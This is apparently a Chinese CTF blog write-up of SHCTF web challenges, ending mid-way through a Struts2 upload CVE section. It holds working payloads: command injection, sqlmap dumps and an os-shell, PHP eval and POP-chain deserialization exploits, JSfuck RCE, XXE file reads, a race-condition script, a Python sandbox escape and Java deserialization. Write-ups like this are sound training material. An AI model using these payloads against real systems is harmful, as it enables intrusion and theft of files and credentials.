---
title: SHCTF 个人题解
description: 'SHCTF web方向的wp'
published: 2026-02-22
updated: 2026-02-24
image: ''
tags: ['CTF', 'WP', "WEB"]
category: 'CTF'
draft: false 
---

## ez-ping
> 域名测试系统中真的只能测试域名吗？我不相信！

经典`ping`网站，`&`既是shell的命令分隔符，又是url的get参数分割符，使用`&`拼接命令：`127.0.0.1/&nl /fla?`即可。

## 上古遗迹档案馆
> 你咋直接攻击我啊？渗透测试里不是这样的啊！你应该先向我发送一个数据确认我是什么类型的题目，然后通过不断测试来找到我的漏洞点，提升测试成功率，最后在特殊漏洞点给我发送点特殊数据，我就会给你我的正确flag，最后你才能得分啊。

**sql注入**，但是有点坑人了，直接sqlmap就能得到flag，位于`archive_db.secret_vault`中的`secret_key`，但出题人本意应该不是直接读，看接下来的过程：

直接sqlmap：

```bash
›  sqlmap -u 'http://challenge.shc.tf:31636/?id=2' --batch --dbs   
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.10#pip}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

available databases [6]:
[*] archive_db
[*] ctftraining
[*] information_schema
[*] mysql
[*] performance_schema
[*] test

›  # 存在可疑数据库ctftraining
›  sqlmap -u 'http://challenge.shc.tf:31636/?id=2' --batch -D ctftraining --tables
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.10#pip}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Database: ctftraining
[3 tables]
+------------+
| FLAG_TABLE |
| news       |
| users      |
+------------+

›  # 爆表发现没有内容
›  sqlmap -u 'http://challenge.shc.tf:31636/?id=2' --batch -D ctftraining -T FLAG_TABLE --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.10#pip}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Database: ctftraining
Table: FLAG_TABLE
[0 entries]
+-------------+
| FLAG_COLUMN |
+-------------+
+-------------+

›  # news里还在骗你
›  sqlmap -u 'http://challenge.shc.tf:31636/?id=2' --batch -D ctftraining -T news --dump 
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.10#pip}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Database: ctftraining
Table: news
[4 entries]
+----+-------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | title | time       | content                                                                                                                                                                                                                                                                                    |
+----+-------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | dog   | 1600763195 | The domestic dog (Canis lupus familiaris when considered a subspecies of the wolf or Canis familiaris when considered a distinct species)[4] is a member of the genus Canis (canines), which forms part of the wolf-like canids,[5] and is the most widely abundant terrestrial carnivore. |
| 2  | cat   | 1600763196 | The cat or domestic cat (Felis catus) is a small carnivorous mammal.[1][2] It is the only domesticated species in the family Felidae.[4] The cat is either a house cat, kept as a pet, or a feral cat, freely ranging and avoiding human contact.                                          |
| 3  | bird  | 1600763196 | Birds, also known as Aves, are a group of endothermic vertebrates, characterised by feathers, toothless beaked jaws, the laying of hard-shelled eggs, a high metabolic rate, a four-chambered heart, and a strong yet lightweight skeleton.                                                |
| 4  | flag  | 1600763196 | Flag is in the database but not here.                                                                                                                                                                                                                                                      |
+----+-------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
```

接下来尝试用sqlmap取得shell：

```bash
›  sqlmap -u 'http://challenge.shc.tf:31636/?id=2' --batch --os-shell  
os-shell> ls /
bin
dev
docker-entrypoint.sh
docker-init
etc
flag.sh
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

能得到shell，在根目录发现`flag.sh`：

```bash title=flag.sh
#!/bin/bash

if [[ -z $FLAG_COLUMN ]]; then
	FLAG_COLUMN="flag"
fi

if [[ -z $FLAG_TABLE ]]; then
	FLAG_TABLE="flag"
fi

# 修改数据库中的 FLAG 
mysql -e "USE ctftraining;ALTER TABLE FLAG_TABLE CHANGE FLAG_COLUMN $FLAG_COLUMN CHAR(128) NOT NULL DEFAULT 'not_flag';ALTER TABLE FLAG_TABLE RENAME $FLAG_TABLE;INSERT $FLAG_TABLE VALUES('$FLAG');" -uroot -proot

export FLAG=not_flag
FLAG=not_flag

rm -f /flag.sh
```

这段代码显然有问题，故意的还是不小心的，`ALTER TABLE FLAG_TABLE CHANGE FLAG_COLUMN`这里根本不能正确插入flag，而且文件也没删掉，接着去看`docker-entrypoint.sh`：

```bash
#!/bin/sh
set -e

if [ "$A1CTF_FLAG" ]; then
    INSERT_FLAG="$A1CTF_FLAG"
    unset A1CTF_FLAG
elif [ "$SHCTF_FLAG" ]; then
    INSERT_FLAG="$SHCTF_FLAG"
    unset SHCTF_FLAG
elif [ "$GZCTF_FLAG" ]; then
    INSERT_FLAG="$GZCTF_FLAG"
    unset GZCTF_FLAG
elif [ "$FLAG" ]; then
    INSERT_FLAG="$FLAG"
    unset FLAG
else
    INSERT_FLAG="SHCTF{!!!!_FLAG_ERROR_ASK_ADMIN_!!!!}"
fi

echo "[*] Starting MySQL..."
if [ -x /etc/init.d/mysql ]; then
  /etc/init.d/mysql start
else
  mysqld_safe --skip-networking &
  sleep 5
fi

echo "[*] Waiting for MySQL..."
for i in $(seq 1 30); do
  if mysqladmin ping --silent; then break; fi
  sleep 1
done

# 设置 root 密码
mysql -uroot -e "ALTER USER 'root'@'localhost' IDENTIFIED BY '060520';" || true

echo "[*] Init Database..."
# 导入 SQL 结构
mysql -uroot -p060520 < /docker-init/db.sql

# 【重要】将环境变量中的真正的 Flag 写入数据库
echo "[*] Inserting Flag..."
mysql -uroot -p060520 archive_db -e "UPDATE secret_vault SET secret_key='$INSERT_FLAG' WHERE id=1;"

# 启动 PHP 和 Nginx
echo "[*] Starting Services..."
php-fpm -D || true
nginx -g 'daemon off;'
```

这里才看到真正的flag插入语句：`mysql -uroot -p060520 archive_db -e "UPDATE secret_vault SET secret_key='$INSERT_FLAG' WHERE id=1;"`，由此得到flag的正确位置。

## kill_king
> 提升自己，杀死King，或者,,,做点别的???

好玩的小游戏。

在页面加载之前按F12就可以打开开发者工具，在源码里看到游戏胜利后会向`check.php`发送post：`result=win`，手动发送，得到：

```php
<?php
// 国王并没用直接爆出flag，而是出现了别的东西？？？
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['result']) && $_POST['result'] === 'win') {
        highlight_file(__FILE__);
        if(isset($_GET['who']) && isset($_GET['are']) && isset($_GET['you'])){
            $who = (String)$_GET['who'];
            $are = (String)$_GET['are'];
            $you = (String)$_GET['you'];
        
            if(is_numeric($who) && is_numeric($are)){
                if(preg_match('/^\W+$/', $you)){
                    $code =  eval("return $who$you$are;");
                    echo "$who$you$are = ".$code;
                }
            }
        }
    } else {
        echo "Invalid result.";
    }
} else {
    echo "No access.";
}
?>
```


这里`$who`和`$are`必须是数字，`$you`不能包含字母、数字和下划线，我们使用如下php代码构造payload：

```php
<?php
echo "who=1&you=|(~" . urlencode(~"system") . ")(~" . urlencode(~"cat /flag") . ")|&are=1";
# who=1&you=|(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98)|&are=1
```

这里使用`|`按位或拼接数字和函数，能让函数正常运行，且结果也能正常运算。
当然，这里用`.`拼接字符串也行。

## calc?js?fuck!
> 怎么又是计算器？又是js？fuck！

考点是无字母js rce，也就是JSfuck

```json
const express = require('express');
const app = express();
const port = 5000;

app.use(express.json());


const WAF = (recipe) => {
    const ALLOW_CHARS = /^[012345679!\.\-\+\*\/\(\)\[\]]+$/;
    if (ALLOW_CHARS.test(recipe)) {
        return true;
    }
    return false;
};


function calc(operator) {
    return eval(operator);
}

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});


app.post('/calc', (req, res) => {
    const { expr } = req.body;
    console.log(expr);
    if(WAF(expr)){
        var result = calc(expr);
        res.json({ result });
    }else{
        res.json({"result":"WAF"});
    }
});


app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});    

```

使用[jsfuck](https://jsfuck.com/)编码`process.mainModule.require('child_process').execSync('cat /flag').toString()`即可。

## Ezphp
> 在未来的某一天，人类已经能够进行太阳系内的旅行。小明作为一名宇航员，被赋予了一项任务：探索太阳系中的不同星球。但是，在旅途中，他发现了一个神秘的坐标，此坐标周围的空间似乎被切割为一块块光滑的镜面，折叠堆积在一块，小明在经过这的时候甚至透过舷窗同时看到了自己的后背和右腿以难以理解的角度拼接在一块。与此同时，他发现该折叠空间内部蕴含了一个小型黑洞，他试图往母星发送这一发现，但在此之前，他需要先离开这里......

考点为`POP链`+`Fast Destruct`。

网页源码为：
```php
<?php

highlight_file(__FILE__);
error_reporting(0);

class Sun{
    public $sun;
    public function __destruct(){
        die("Maybe you should fly to the ".$this->sun);
    }
}

class Solar{
    private $Sun;
    public $Mercury;
    public $Venus;
    public $Earth;
    public $Mars;
    public $Jupiter;
    public $Saturn;
    public $Uranus;
    public $Neptune;
    public function __set($name,$key){
        $this->Mars = $key;
        $Dyson = $this->Mercury;
        $Sphere = $this->Venus;
        $Dyson->$Sphere($this->Mars);
    }
    public function __call($func,$args){
        if(!preg_match("/exec|popen|popens|system|shell_exec|assert|eval|print|printf|array_keys|sleep|pack|array_pop|array_filter|highlight_file|show_source|file_put_contents|call_user_func|passthru|curl_exec/i", $args[0])){
            $exploar = new $func($args[0]);
            $road = $this->Jupiter;
            $exploar->$road($this->Saturn);
        }
        else{
            die("Black hole");
        }
    }
}

class Moon{
    public $nearside;
    public $farside;
    public function __tostring(){
        $starship = $this->nearside;
        $starship();
        return '';
    }
}

class Earth{
    public $onearth;
    public $inearth;
    public $outofearth;
    public function __invoke(){
        $oe = $this->onearth;
        $ie = $this->inearth;
        $ote = $this->outofearth;
        $oe->$ie = $ote;
    }
}



if(isset($_POST['travel'])){
    $a = unserialize($_POST['travel']);
    throw new Exception("How to Travel?");
}
```

构造pop链如下：

```php
<?php
class Sun {
    public $sun;
}

class Moon {
    public $nearside;
}

class Earth {
    public $onearth;
    public $inearth;
    public $outofearth;
}

class Solar {
    public $Mercury;
    public $Venus;
    public $Jupiter;
    public $Saturn;
}

// Sun::__desturct ->
// Moon::__toString ->
// Earth::__invoke ->
// Solar::__set($name,$key)
//   $key = $this->outofearth
// ->
// Solar::__call($func,$args)
//   $func = $Dyson->$Sphere = $this->Mercury->$this->Venus;
//   $args = $this->Mars = $key
// ->
// $exploar = new $func($args[0]);
// $road = $this->Jupiter;
// $exploar->$road($this->Saturn);

$payload = new Sun();
$payload->sun = new Moon();
$payload->sun->nearside = new Earth();
$payload->sun->nearside->onearth = new Solar();
$payload->sun->nearside->inearth = "none";
$payload->sun->nearside->outofearth = "readfile";
$payload->sun->nearside->onearth->Mercury = new Solar();
$payload->sun->nearside->onearth->Venus = "ReflectionFunction";
$payload->sun->nearside->onearth->Mercury->Jupiter = "invoke";
$payload->sun->nearside->onearth->Mercury->Saturn = "/etc/passwd";


echo serialize($payload);
?>
```

直接提交序列化后的payload是不会有任何输出的，这就是一个非常经典的环境问题。

通过wapplayzer能看到，服务器的后端为`Nginx`，

`Nginx`+`PHP-FPM`对`Fatal Error`或`Uncaught Exception`有特殊的处理机制：

- 代码末尾有一句 `throw new Exception(...)`，一般的处理逻辑为：`unserialize` -> 抛出异常 -> 脚本中止 (HTTP 500) -> 执行对象销毁 (`__destruct`) -> 输出结果。

- 但在 Nginx 环境下，当 PHP 抛出未捕获的异常导致 HTTP 状态码变为 500 时，Nginx 可能会**丢弃** PHP 进程在缓冲区中输出的内容（包括 `readfile` 或 `Black hole`），直接显示 Nginx 默认的错误页或空白页。

所以我们需要使用 **Fast Destruct（快速析构/GC 提前回收）** 技巧。  
我们要强迫 `Sun` 对象在 `unserialize` 函数执行**期间**就销毁，而不是等到脚本结束（即在 `throw new Exception` 之前）。这样，`Sun::__destruct` 中的 `die()` 会被执行，脚本会正常结束（HTTP 200），从而避开后面的异常抛出。

所以我们修改一下payload：
```php
echo 'a:2:{i:0;' . serialize($payload) . 'i:0;i:1;}';
```

使用数组包裹paylaod为第0号索引，之后再添加任意元素索引也为0

反序列化数组时，先解析第0个元素为对象，然后解析第二个元素，发现索引也是0，于是覆盖掉刚才的对象。被覆盖的对象引用计数归零，提前GC，于是立马`__destruct`，此时`unserialize`还没结束，使得在`throw new Exception`之前就能执行代码。

## 05_em_v_CFK
> 继某两所大学校内餐厅被黑后，终于考上大学的小明也想“逝世”，但是他遇到了一些困难于是请求你的帮助。他给你留了一个webshell，并给你的一条线索，去帮他完成吧。
> 
> ~~请联系CTF生活，写一篇文章，谈谈你的认识与思考。~~
> ~~要求:(1)自拟题目;(2)不少于 800字。~~

查看源码发现`5bvE5YvX5Ylt5YdT5Yvdp2uyoTjhpTujYPQyhXoxhVcmnT935L+P5cJjM2I05oPC5cvB55dR5Mlw6LTK54zc5MPa`，是ROT13映射的base64加密，解密得到：
`我上传了个shell.php, 带上show参数get小明的圣遗物吧`。

然后满世界去找这个shell，最后在`/uploads/shell.php?show=1`下找到php：

```php
<?php

if (isset($_GET['show'])) {
    highlight_file(__FILE__);
}

$pass = 'c4d038b4bed09fdb1471ef51ec3a32cd';

if (isset($_POST['key']) && md5($_POST['key']) === $pass) {
    if (isset($_POST['cmd'])) {
        system($_POST['cmd']);
    } elseif (isset($_POST['code'])) {
        eval($_POST['code']);
    }
} else {
    http_response_code(404);
}
```

爆破出key为`114514`，越来越想骂出题人了。

得到shell后在网页运行目录发现被混淆了的php:`connect.php`，看看index.php的源码：

```php
<?php
include 'connect.php';

$my_money = 3.00;
$msg = "";
$target_id = 0;

if (isset($_POST['buy']) && isset($_POST['item_id'])) {
    $target_id = (int)$_POST['item_id'];

    if ($target_id > 0) {
        try {
            $stmt = $pdo->prepare("CALL buy_item(?, ?)");
            $stmt->execute([$target_id, $my_money]);
            $res = $stmt->fetch();
            $msg = $res['final_message'];
            $my_money -= $res['current_price'];
        } catch (Exception $e) {
            $msg = "Transaction Error: " . $e->getMessage();
        }
    } else {
        $msg = "Invalid item selected.";
    }
} else {
    try {
        $stmt = $pdo->query("SELECT id, name, price FROM goods ORDER BY id ASC");
        if ($stmt === false) {
            exit;
        }
        $goods_list = $stmt->fetchAll();
    } catch (Exception $e) {
        die("Error fetching goods list.");
    }
}
```

正好`shell.php`能直接执行php代码，我们直接仿照源码去白嫖flag就行了：

```bash
?key=114514
&code=include '../connect.php';$stmt=$pdo->prepare('CALL buy_item(3,100)');$stmt->execute();var_dump($stmt->fetch());
```

## Go
> 我们开发了一个由 Go 语言编写的安全验证系统。防火墙（WAF）发誓它已经拦截了所有的 admin 角色请求。

打开网页只得到一个json:

```json
{
	"username": "guest",
	"role": "guest",
	"message": "Access denied. Only role='admin' can view the flag."
}
```

看题目提示，盲猜向页面post传json：

```json
{
	"role": "admin"
}
```

果然得到：

```json
{
    "error": "🚫 WAF Security Alert: 'admin' value is strictly forbidden in 'role' field!"
}
```

利用`Go`的`json.Unmarshal`在映射`json`到`go结构体`时，默认**不区分键名大小写**，构造如下payload即可得到flag：

```json
{
    "Role": "admin"
}
```

## Mini Blog
> 完全安全的博客系统。

`XXE`

博客发布页，查看发布文章`/create`页面的源码，发现js代码会将我们的内容转为xml上传，随便写点，上传抓包，果然发现xml：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<post>
    <title>123</title>
    <content>123</content>
</post>
```

直接改为xxe的payload即可得到flag。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<post>
  <title>&xxe;</title>
  <content>XXE</content>
</post>
```

## ez_race
> 狠狠赚钱

考点就是Race Condition,`条件竞争`

下载得到网页的源码，找到`bank/views.py>WithdrawView>form_valid`这里，也就是代码的第25行：

```python
    def form_valid(self, form):
        amount = form.cleaned_data["amount"]
        with transaction.atomic():
            time.sleep(1.0)
            user = models.User.objects.get(pk=self.request.user.pk)
            if user.money >= amount:
                user.money = F('money') - amount
                user.save()
                models.WithdrawLog.objects.create(user=user, amount=amount)
        
        user.refresh_from_db()
        if user.money < 0:
            return HttpResponse(os.environ.get("FLAG", "flag{flag_test}"))
            
        return redirect(self.get_success_url())
```

这里的`time.sleep(1.0)`明显是出题人故意留给我们的切入点，同时快速重复发包，让两次线程都查询到`if user.money >= amount`成立，发生两次扣款，直到把钱扣成负的。

我们直接用测试帐号登录，10块钱的新手红包就不领了，在充值界面发包拦截得到cookie内的`sessionid`、`csrftoken`，和请求体里的`csrfmiddlewaretoken`，这个字段是每次进入充值页面时服务器生成在表单里的隐藏字段，但是时效性过长，能够被多次使用，所以我们只获取一次就够了，编写脚本发包：

```php
import requests
import threading
import re

URL: str = "http://challenge.shc.tf:31301"

COOKIES: dict[str, str] = {
    "sessionid": "5s8jbubxrjamavcvy53r9dfhgrqn2uvb", 
    "csrftoken": "ta6UqD8PHRlRfYgmKkD2upwKGBzvKmgt"
}

DATA: dict[str, str] = {
    "amount": 10, 
    "csrfmiddlewaretoken": "1jZpWo6xPMHslmXCQCPquxAFkgarj5gckjV9cR4cmtS9qa3OqMiiOMWfQHzMThmv"
}

def attack(debug=False):
    response = requests.post(URL+"/withdraw",
        data = DATA,
        cookies = COOKIES,
    )
    html = response.text
    print(f"[+] Status: {response.status_code}, Response Length: {len(html)}")
    if "SHCTF{" in response.text: print(f"[!] Found flag: {re.search(r'SHCTF\{.*\}', response.text)[0]}")
    if debug: print(f"[+] Response: {html}")

t1 = threading.Thread(target=attack)
t2 = threading.Thread(target=attack)

t1.start()
t2.start()

t1.join()
t2.join()

# attack(debug=True)
```

并行太多可能导致服务器返回502，两个线程足够了。这样我们就能倒欠服务器10块，得到flag。最后再去把新手礼包领了就两不相欠了:)

## Eazy_Pyrunner
> 任何人都可以运行自己的 Python 程序！不过大嗨客就算了，还有运行的程序必须是我喜欢的。

题目上写的是中等难度，题本身难度确实不高，但是黑盒，真的很折磨人，这里对着打进去后找到的源码来讲比较清晰一点：

```python
from flask import Flask, render_template_string, request, jsonify
import subprocess
import tempfile
import os
import sys

app = Flask(__name__)

@app.route('/')
def index():
    file_name = request.args.get('file', 'pages/index.html')
    try:
        with open(file_name, 'r', encoding='utf-8') as f:
            content = f.read()
    except Exception as e:
        with open('pages/index.html', 'r', encoding='utf-8') as f:
            content = f.read()
    
    return render_template_string(content)

def waf(code):
    blacklisted_keywords = ['import', 'open', 'read', 'write', 'exec', 'eval', '__', 'os', 'sys', 'subprocess', 'run', 'flag', "'", '"']
    for keyword in blacklisted_keywords:
        if keyword in code:
            return False
    return True    

@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.json.get('code', '')
    
    if not code:
        return jsonify({'error': '请输入Python代码'})
    
    if not waf(code):
        return jsonify({'error': 'Hacker!'})
    
    try:
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(f"""import sys

sys.modules['os'] = 'not allowed'

def is_my_love_event(event_name):
    return event_name.startswith("Nothing is my love but you.")

def my_audit_hook(event_name, arg):
    if len(event_name) > 0:
        raise RuntimeError("Too long event name!")
    if len(arg) > 0:
        raise RuntimeError("Too long arg!")
    if not is_my_love_event(event_name):
        raise RuntimeError("Hacker out!")

__import__('sys').addaudithook(my_audit_hook)

{code}""")
            temp_file_name = f.name
        
        result = subprocess.run(
            [sys.executable, temp_file_name],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        os.unlink(temp_file_name)
        
        return jsonify({
            'stdout': result.stdout,
            'stderr': result.stderr
        })
    
    except subprocess.TimeoutExpired:
        return jsonify({'error': '代码执行超时（超过10秒）'})
    except Exception as e:
        return jsonify({'error': f'执行出错: {str(e)}'})
    finally:
        if os.path.exists(temp_file_name):
            os.unlink(temp_file_name)

if __name__ == '__main__':
    app.run(debug=True)
```

waf里能看到单双引号都被过滤了，所以构造字符串我们使用`chr(i)+chr(j)`或`bytes([i, j]).decode()`绕过，其他的模块名可以直接全角字符绕过。

盲打的时候就慢慢试出来waf了，先看看有什么模块
```python
print(ｓｙｓ.modules)
```

```python
{
    'sys': <module 'sys' (built-in)>,
    'builtins': <module 'builtins' (built-in)>,
    '_frozen_importlib': <module '_frozen_importlib' (frozen)>,
    '_imp': <module '_imp' (built-in)>,
    '_thread': <module '_thread' (built-in)>,
    '_warnings': <module '_warnings' (built-in)>,
    '_weakref': <module '_weakref' (built-in)>,
    '_io': <module '_io' (built-in)>,
    'marshal': <module 'marshal' (built-in)>,
    'posix': <module 'posix' (built-in)>,
    '_frozen_importlib_external': <module '_frozen_importlib_external' (frozen)>,
    'time': <module 'time' (built-in)>,
    'zipimport': <module 'zipimport' (frozen)>,
    '_codecs': <module '_codecs' (built-in)>,
    'codecs': <module 'codecs' (frozen)>,
    'encodings.aliases': <module 'encodings.aliases' from '/usr/local/lib/python3.12/encodings/aliases.py'>,
    'encodings': <module 'encodings' from '/usr/local/lib/python3.12/encodings/__init__.py'>,
    'encodings.utf_8': <module 'encodings.utf_8' from '/usr/local/lib/python3.12/encodings/utf_8.py'>,
    '_signal': <module '_signal' (built-in)>,
    '_abc': <module '_abc' (built-in)>,
    'abc': <module 'abc' (frozen)>,
    'io': <module 'io' (frozen)>,
    '__main__': <module '__main__' from '/tmp/tmp7ysmi_p1.py'>,
    '_stat': <module '_stat' (built-in)>,
    'stat': <module 'stat' (frozen)>,
    '_collections_abc': <module '_collections_abc' (frozen)>,
    'genericpath': <module 'genericpath' (frozen)>,
    'posixpath': <module 'posixpath' (frozen)>,
    'os.path': <module 'posixpath' (frozen)>,
    'os': 'not allowed',
    '_sitebuiltins': <module '_sitebuiltins' (frozen)>,
    'site': <module 'site' (frozen)>,
    'unicodedata': <module 'unicodedata' from '/usr/local/lib/python3.12/lib-dynload/unicodedata.cpython-312-x86_64-linux-musl.so'>
}

```

可以看到`os`被改为了`not allowed`，有个`posix`还是很有用的，不过。。。

```python
modules = ｓｙｓ.modules
po6 = modules[chr(112)+chr(111)+chr(115)+chr(105)+chr(120)]

try: po6.listdir()
except Exception as e: print(e)
```

得到：
```bash
Too long event name!
```

这提示也太坑人了，对不上脑洞的我只好去查一次`__main__`：

```python
modules = ｓｙｓ.modules
builtins = modules[chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)]
getattr = builtins.getattr

dunder_main = chr(95)+chr(95)+chr(109)+chr(97)+chr(105)+chr(110)+chr(95)+chr(95)
dunder_dict = chr(95)+chr(95)+chr(100)+chr(105)+chr(99)+chr(116)+chr(95)+chr(95)

try: print(getattr(modules[dunder_main], dunder_dict)) 
except Exception as e: print(e)
```

得到：
```python
{
    '__name__': '__main__',
    '__doc__': None,
    '__package__': None,
    '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f177112ab40>,
    '__spec__': None,
    '__annotations__': {},
    '__builtins__': <module 'builtins' (built-in)>,
    '__file__': '/tmp/tmpfxgm71qm.py',
    '__cached__': None,
    'sys': <module 'sys' (built-in)>,
    'is_my_love_event': <function is_my_love_event at 0x7f17713faac0>,
    'my_audit_hook': <function my_audit_hook at 0x7f1771165580>,
    ...
}
```

这里就能看到审计函数`is_my_love_event`和审计钩子`my_audit_hook`，不过不看源码谁能猜到，最后还是到处碰壁，同时覆盖`len`函数和`is_my_love_event`就能绕过waf：

```python
modules = ｓｙｓ.modules

len = lambda x: 0
is_my_love_event = lambda x: True

po6 = modules[chr(112)+chr(111)+chr(115)+chr(105)+chr(120)]

try: print(po6.listdir(chr(47))) # /
except Exception as e: print(e)
```

最后也是成功读取到根目录：

```python
['bin', 'dev', 'etc', 'home', 'lib', 'media', 'mnt', 'opt', 'proc', 'root', 'run', 'sbin', 'srv', 'sys', 'tmp', 'usr', 'var', 'flag', 'read_flag', 'app']
```

### posix

`/flag`直接读是没有权限的，因为`posix`没有`popen`，所以只能用`system`写出`/read_flag > /tmp/flag`，再用`posix.read(posix.open("/tmp/flag", 0), 100)`读文件：

```python
modules = ｓｙｓ.modules

len = lambda x: 0
is_my_love_event = lambda x: True

po6 = modules[chr(112)+chr(111)+chr(115)+chr(105)+chr(120)]
tmp_Flag = chr(47)+chr(116)+chr(109)+chr(112)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)
cmd = chr(47)+chr(114)+chr(101)+chr(97)+chr(100)+chr(95)+chr(102)+chr(108)+chr(97)+chr(103)+chr(32)+chr(62)+chr(32) + tmp_Flag

try:
    po6.ｓｙｓｔｅｍ(cmd)
    fd = po6.ｏｐｅｎ(tmp_Flag, 0)
    print(po6.ｒｅａｄ(fd, 20000))
except Exception as e: print(e)
```

### os

之前也看到，`os`的被赋值为了`not allowed`，我们想要得到**模块os**，就要先删除这个**字符串os**，再重新导入：

```python
modules = ｓｙｓ.modules
builtins = modules[chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)]
getattr = builtins.getattr

len = lambda x: 0
is_my_love_event = lambda x: True

modules.pop(chr(111)+chr(115))

dunder_imp = chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)
imp = getattr(builtins, dunder_imp)
OS = imp(chr(111)+chr(115))

print(OS.ｐｏｐｅｎ(chr(108)+chr(115)+chr(32)+chr(47)).ｒｅａｄ()) # ls /
```

### Site

除了直接弹出，我们知道`site`模块在初始化时自动导入，它内部导入了`os`。即使`sys.modules['os']`被修改了，`site`模块因为加载更早，它内部的`os`仍是纯净的：

```python
modules = ｓｙｓ.modules

len = lambda x: 0
is_my_love_event = lambda x: True

site = modules[chr(115)+chr(105)+chr(116)+chr(101)]
OS = site.ｏｓ
modules[chr(111)+chr(115)] = OS

print(OS.ｐｏｐｅｎ(chr(108)+chr(115)+chr(32)+chr(47)).ｒｅａｄ())
```

注意这里的`modules[chr(111)+chr(115)] = OS`复原`os`是必要的，因为`os.popen`在 Python 3 中本质上就是`subprocess.Popen`的一个封裝，而`subprocess`模块初始化时又需要用到`os`内的函数，不加就会遇到以下报错：

```python
Traceback (most recent call last):
  File "/tmp/tmppu69wi2n.py", line 30, in <module>
    print(OS.ｐｏｐｅｎ(chr(108)+chr(115)+chr(32)+chr(47)).ｒｅａｄ())
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "<frozen os>", line 1020, in popen
  File "/usr/local/lib/python3.12/subprocess.py", line 106, in <module>
    _waitpid = os.waitpid
               ^^^^^^^^^^
AttributeError: 'str' object has no attribute 'waitpid'
```

报错也解释了，`os`是字符串，而字符串显然没有`waitpid`属性。

所以原理上`subprocess`，也能实现`popen`的功能，但是因为是这道题里os模块不可用，想用`subprocess`还得先还原`os`，就有点多此一举了。

## 你也懂java？

这道题是非常基础的`Java 反序列化` **(Java Deserialization)**，

给出了网页源码：

```java
public void handle(HttpExchange exchange) throws IOException {
    String method = exchange.getRequestMethod();
    String path = exchange.getRequestURI().getPath();

    if ("POST".equalsIgnoreCase(method) && "/upload".equals(path)) {
        try (ObjectInputStream ois = new ObjectInputStream(exchange.getRequestBody())) {
            Object obj = ois.readObject();
            if (obj instanceof Note) {
                Note note = (Note) obj;
                if (note.getFilePath() != null) {
                    echo(readFile(note.getFilePath()));
                }
            }
        } catch (Exception e) {}
    }
}
```

和危险对象类`Note.class`，直接在这里构造反序列化：

```java
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

public class Note implements Serializable {
    private static final long serialVersionUID = 1L;

    private String title;
    private String message;
    private String filePath;

    public Note(String title, String message, String filePath) {
        this.title = title;
        this.message = message;
        this.filePath = filePath;
    }

    public String getTitle() {
        return title;
    }

    public String getMessage() {
        return message;
    }

    public String getFilePath() {
        return filePath;
    }

    public static void main(String[] args) throws Exception {
        Note payload = new Note("", "", "/flag");
        String URL = "http://challenge.shc.tf:31372/upload";

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(payload);
        byte[] serializedData = baos.toByteArray();

        // 使用 HttpClient 发送 POST 请求
        HttpClient client = HttpClient.newHttpClient();
        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(URL))
                .header("Content-Type", "application/octet-stream")
                .POST(HttpRequest.BodyPublishers.ofByteArray(serializedData))
                .build();

        HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

        System.out.println(response.body());
    }
}
```

这里使用 Java 11 的 HttpClient 类来发包，可以少写不少代码，~~虽然还是很多~~

## BabyJavaUpload

> 像Java这么高级的编程语言，CVE里面应该不会存着什么乱起八糟的getshell漏洞吧？）

考点为 **CVE-2023-50164(S2-066)** 文件上传漏洞。

打开就是一个文件上传页，允许上传绝大部分的文件类型，但是不知道上传路径，我们随便上传一个文件，文件名最后加一个斜杠为非法文件路径，能得到报错：

```java
java.lang.IllegalArgumentException: Parameter 'destFile' is not a file: /usr/local/tomcat/webapps/ROOT/WEB-INF/uplOadAS/up1oad
	org.apache.commons.io.FileUtils.requireFile(FileUtils.java:2737)
	org.apache.commons.io.FileUtils.requireFileIfExists(FileUtils.java:2766)
	org.apache.commons.io.FileUtils.copyFile(FileUtils.java:844)
	org.apache.commons.io.FileUtils.copyFile(FileUtils.java:756)
	blckder02.struts2.action.UploadAction.execute(UploadAction.java:30)
	sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
